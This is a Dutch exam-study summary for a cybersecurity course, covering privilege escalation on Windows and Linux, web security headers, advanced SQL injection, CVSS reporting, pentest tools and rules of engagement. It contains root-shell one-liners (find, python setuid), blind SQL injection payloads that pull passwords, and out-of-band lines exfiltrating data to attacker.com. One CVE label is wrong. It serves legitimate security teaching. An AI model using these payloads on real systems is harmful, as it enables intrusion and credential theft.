reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

**Exploitation:**
- Maak malicious MSI package
- Installeer met elevated privileges

### Scheduled Tasks Misconfiguration

**Vulnerability:**
- Scheduled tasks die draaiien als SYSTEM
- Task executable heeft write permissions voor low-priv user

**Detection:**
```powershell
schtasks /query /fo LIST /v
icacls C:\Path\To\Task\Executable.exe
```

**Exploitation:**
- Replace executable met malicious version
- Wacht tot scheduled time
- Task draait met elevated privileges

---

## Linux Privilege Escalation - Detailed

### SUID Binaries Exploitation

**SUID Concept:**
- Set User ID bit
- Binary draait met permissions van owner
- Vaak root-owned binaries

**Find SUID Binaries:**
```bash
find / -perm -4000 -type f 2>/dev/null
find / -uid 0 -perm -4000 -type f 2>/dev/null
```

**Common Exploitable SUID Binaries:**
- /usr/bin/find
- /usr/bin/vim
- /usr/bin/nano
- /usr/bin/cp
- /usr/bin/mv

**GTFOBins Resource:**
- Website: https://gtfobins.github.io/
- Exploitation methods voor Unix binaries
- SUID, sudo, capabilities exploitation

**Voorbeeld Exploitation (find):**
```bash
find . -exec /bin/bash -p \; -quit
```

### Sudo Misconfigurations

**Check Sudo Rights:**
```bash
sudo -l
```

**Common Misconfigurations:**

**NOPASSWD:**
```
user ALL=(ALL) NOPASSWD: /usr/bin/vim
```
- Vim kan gebruikt worden voor shell escape

**Wildcards:**
```
user ALL=(ALL) /bin/tar *
```
- Wildcard exploitation mogelijk

**ENV Variables:**
```
user ALL=(ALL) SETENV: /usr/bin/script.sh
```
- Environment variable manipulation

### Capabilities

**Definitie:**
- Granulaire privileges op binary level
- Alternative voor SUID
- Delen van root privileges

**List Capabilities:**
```bash
getcap -r / 2>/dev/null
```

**Dangerous Capabilities:**

**CAP_SETUID:**
- Toestaat arbitrary UID changes
- Direct privilege escalation

**CAP_DAC_READ_SEARCH:**
- Bypass file read permission checks
- Read sensitive files

**CAP_DAC_OVERRIDE:**
- Bypass file permission checks
- Read/write/execute any file

**Exploitation Example (python with cap_setuid):**
```python
import os
os.setuid(0)
os.system("/bin/bash")
```

### Kernel Exploits

**Identification:**
```bash
uname -a
cat /proc/version
searchsploit linux kernel [version]
```

**Risico's:**
- Kan systeem crashen
- Zeer noisy
- Gemakkelijk detecteerbaar
- Laatste redmiddel

**Common Kernel Exploits:**
- Dirty COW (CVE-2016-5195)
- DirtyCred (CVE-2022-0847)
- Various local privilege escalation exploits

### Cron Job Exploitation

**Interesting Locations:**
```bash
/etc/crontab
/etc/cron.d/
/var/spool/cron/crontabs/
```

**Wildcard Injection:**
- Cron jobs met wildcard arguments
- Inject malicious filenames

**World-Writable Scripts:**
```bash
find /etc/cron* -type f -perm -o+w
```

**PATH Exploitation:**
- Cron jobs zonder absolute paths
- PATH manipulation

---

## Web Application Security - Diepgaand

### Content Security Policy (CSP)

**Definitie:**
- HTTP response header
- Whitelisting van content sources
- XSS mitigatie mechanisme

**Voorbeeld Header:**
```
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.com
```

**Directives:**
- default-src: Fallback voor alle resource types
- script-src: JavaScript sources
- style-src: CSS sources
- img-src: Image sources
- connect-src: AJAX, WebSocket, EventSource

**CSP Bypass Technieken:**
- JSONP endpoints misbruik
- Unsafe-inline in policy
- Base-uri manipulation
- Dangling markup injection

### Same-Origin Policy (SOP)

**Concept:**
- Browser security mechanisme
- Isoleert content van verschillende origins
- Origin = protocol + domain + port

**Voorbeeld:**
```
http://example.com:80/page.html
- Protocol: http
- Domain: example.com
- Port: 80
```

**Beperkingen:**
- JavaScript kan niet lezen van andere origin
- AJAX requests beperkt tot same origin
- DOM access restricted

**Exceptions:**
- Cross-Origin Resource Sharing (CORS)
- postMessage API
- JSONP (legacy)

### CORS (Cross-Origin Resource Sharing)

**Headers:**

**Response Headers:**
```
Access-Control-Allow-Origin: https://trusted.com
Access-Control-Allow-Credentials: true
Access-Control-Allow-Methods: GET, POST
Access-Control-Allow-Headers: Content-Type
```

**Misconfigurations:**

**Wildcard met Credentials:**
```
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```
- Niet toegestaan door browsers
- Maar misconfiguraties komen voor

**Null Origin:**
```
Access-Control-Allow-Origin: null
```
- Kan geëxploiteerd worden via iframe sandbox

**Reflection zonder Validatie:**
- Server reflecteert Origin header zonder check
- Arbitrary origin access

### Authentication Bypass Technieken

**2FA Bypass Methods:**

**Direct Navigation:**
- Login → 2FA page → Navigate direct naar dashboard
- Missing server-side validation

**Response Manipulation:**
- Modify response "2fa_required": false
- Client-side check only

**Code Reuse:**
- 2FA codes niet geïnvalideerd na gebruik
- Rate limiting ontbreekt

**Session Fixation:**
- Session token gegenereerd voor 2FA check
- Reuse token na failed 2FA

### SQL Injection - Advanced

**Second Order SQLi:**
- Payload opgeslagen in stap 1
- Exploitatie in stap 2
- Timing maakt detectie moeilijk

**Boolean-Based Blind:**
```sql
' AND 1=1-- (True response)
' AND 1=2-- (False response)
```
- Extractie via binary search
- Character-by-character exfiltration

**Time-Based Blind:**
```sql
' AND IF(1=1, SLEEP(5), 0)--
' AND IF(SUBSTRING(password,1,1)='a', SLEEP(5), 0)--
```

**Out-of-Band (OOB):**
```sql
'; EXEC xp_dirtree '\\attacker.com\share'--
'; SELECT LOAD_FILE(CONCAT('\\\\',password,'.attacker.com\\'))--
```

**WAF Bypass Technieken:**
- Case manipulation: SeLeCt
- Comments: SE/**/LECT
- Encoding: %53%45%4C%45%43%54
- Alternative syntax: UNION SELECT vs UNION ALL SELECT

---

## Network Security - Additional

### Port Knocking

**Concept:**
- Sequence van connection attempts
- Opens firewall port na correcte sequence
- Stealth technique voor service access

**Implementation:**
- Knock daemon luistert op alle ports
- Sequence detection triggers firewall rule
- Timeout closes port automatically

### Defense in Depth

**Layers:**
1. **Perimeter:** Firewall, IDS/IPS
2. **Network:** Segmentatie, VLANs
3. **Endpoint:** Antivirus, EDR
4. **Application:** WAF, input validation
5. **Data:** Encryption, access control

**Principle:**
- Meerdere verdedigingslagen
- Failure van één laag niet catastrofaal
- Comprehensive security approach

### Honeypots

**Definitie:**
- Decoy systemen
- Attracteren aanvallers
- Detectie en analyse doeleinden

**Types:**
- Low-interaction: Geëmuleerde services
- High-interaction: Echte systemen
- Production honeypots: Voor detectie
- Research honeypots: Voor threat intelligence

**Gebruik:**
- Early warning system
- Attacker behavior analysis
- Reduce false positives in IDS
- Legal evidence gathering

---

## Rapportering - Best Practices

### CVSS (Common Vulnerability Scoring System)

**Metrieken:**

**Base Score (0-10):**
- Attack Vector (Network/Adjacent/Local/Physical)
- Attack Complexity (Low/High)
- Privileges Required (None/Low/High)
- User Interaction (None/Required)
- Confidentiality Impact (None/Low/High)
- Integrity Impact (None/Low/High)
- Availability Impact (None/Low/High)

**Risico Classificatie:**
- 0.0: None
- 0.1-3.9: Low
- 4.0-6.9: Medium
- 7.0-8.9: High
- 9.0-10.0: Critical

### Remediëring Prioritering

**Factoren:**
1. **CVSS Score:** Technische severity
2. **Exploitability:** Hoe makkelijk exploitable
3. **Asset Value:** Waarde van gecompromitteerd systeem
4. **Exposure:** Intern vs extern bereikbaar
5. **Mitigating Controls:** Aanwezige compenserende controls

**Priority Matrix:**
```
Impact vs Likelihood:
High Impact + High Likelihood = Critical (Fix immediately)
High Impact + Low Likelihood = High (Fix soon)
Low Impact + High Likelihood = Medium (Scheduled fix)
Low Impact + Low Likelihood = Low (Monitor)
```

### Executive Summary Componenten

**Must-Have Elements:**
- Test scope en duration
- Number of findings per severity
- Top 3-5 critical issues
- Overall risk rating
- High-level recommendations
- Business impact assessment

**Visualisaties:**
- Pie chart: Vulnerabilities by severity
- Bar chart: Findings by category
- Trend line: Risk over time (bij repeat tests)
- Heat map: Risk by system/application

### Effective Remediation Advies

**SMART Principle:**
- **S**pecific: Exacte stappen
- **M**easurable: Verificeerbare outcome
- **A**chievable: Praktisch uitvoerbaar
- **R**elevant: Gelinkt aan vulnerability
- **T**ime-bound: Deadline/prioriteit

**Voorbeeld (Slecht):**
"Fix SQL injection vulnerabilities"

**Voorbeeld (Goed):**
"Implement prepared statements in login.php (line 45) and search.php (line 112). Replace string concatenation with parameterized queries. Verification: Repeat SQL injection tests from section 3.2. Priority: Critical. Deadline: 2 weeks."

---

## Aanvullende Tools

### Burp Suite

**Functionaliteit:**
- Proxy: Intercept HTTP/HTTPS traffic
- Scanner: Automated vulnerability scanning
- Repeater: Manual request modification
- Intruder: Automated attacks (fuzzing, brute force)
- Sequencer: Token randomness analysis

**Common Uses:**
- Session token analysis
- Parameter tampering
- Authentication testing
- Input validation bypass

### OWASP ZAP

**Alternative voor Burp:**
- Open source
- Active en passive scanning
- Automated spider
- Fuzzing capabilities

### Additional Enumeration Tools

**Windows:**
- PowerUp.ps1: Privilege escalation checks
- Sherlock.ps1: Missing patches
- Watson: Vulnerability identification

**Linux:**
- LinPEAS: Linux Privilege Escalation Awesome Script
- Linux Smart Enumeration (LSE)
- pspy: Monitor processes zonder root

### Password Cracking

**John the Ripper:**
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
john --show hashes.txt
```

**Hashcat:**
```bash
hashcat -m 1000 -a 0 hashes.txt wordlist.txt
hashcat -m 1000 -a 3 hashes.txt ?a?a?a?a?a?a
```

**Wordlists:**
- rockyou.txt: Most common
- SecLists: Comprehensive collection
- Custom wordlists: Context-specific

---

## Legal en Ethische Aspecten

### Pentesting Scope Document

**Essentiële Elementen:**
- In-scope systemen (IP ranges, domains)
- Out-of-scope systemen (expliciet)
- Allowed attack types
- Forbidden actions (DoS, data destruction)
- Testing timeframe
- Contact persons
- Emergency procedures

### Rules of Engagement

**Gedragsregels:**
- No data exfiltration (tenzij expliciet toegestaan)
- No permanent modifications
- Report critical findings immediately
- Stop testing if instructed
- Maintain confidentiality

### Responsible Disclosure

**Process:**
1. Discover vulnerability
2. Document thoroughly
3. Contact vendor/organization privately
4. Provide reasonable time to fix (typically 90 days)
5. Public disclosure after fix or deadline

**Bug Bounty Etiquette:**
- Follow program rules strictly
- Don't test out-of-scope
- Report duplicates honestly
- Be professional in communication

---

## Conclusie

Deze aanvullende sectie vult de ontbrekende theoretische concepten aan uit de slides. De combinatie met de bestaande samenvatting biedt nu een volledig overzicht van de Cybersecurity 3 leerstof, inclusief:

- Network protocols (LLDP) en hun security implicaties
- Advanced Metasploit usage en post-exploitation
- Diepgaande privilege escalation technieken (Windows & Linux)
- Web application security mechanismen (CSP, CORS, SOP)
- Advanced SQL injection en bypass technieken
- Network security concepten (Defense in Depth, Honeypots)
- Professional rapportering met CVSS en prioritering
- Aanvullende tools en legal/ethical aspecten

Gebruik deze samenvatting in combinatie met de praktische oefeningen op TryHackMe voor volledige voorbereiding op het examen.